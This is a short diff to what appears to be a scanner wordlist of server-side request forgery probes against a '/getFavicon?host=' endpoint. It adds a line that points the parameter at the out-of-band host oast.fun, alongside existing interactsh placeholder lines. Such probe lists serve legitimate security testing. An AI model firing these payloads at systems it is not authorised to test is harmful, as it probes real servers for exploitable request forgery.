@@ -1,2 +1,3 @@
 /getFavicon?host=http://{{interactsh-url}}/
 /getFavicon?host=http://{{interactsh-url}}
+/getFavicon?host=http://oast.fun/
